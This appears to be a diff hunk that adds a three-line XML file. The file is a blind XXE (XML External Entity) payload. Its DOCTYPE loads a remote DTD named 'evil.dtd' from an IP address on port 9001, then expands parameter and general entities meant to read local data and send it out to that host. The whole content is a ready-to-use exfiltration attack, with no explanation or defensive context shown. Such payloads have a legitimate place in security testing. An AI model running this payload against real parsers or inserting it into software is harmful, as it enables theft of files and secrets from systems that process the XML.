@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % remote SYSTEM "http://10.14.68.76:9001/evil.dtd"> %remote;%param1;]>
+<foo>&exfil;</foo>
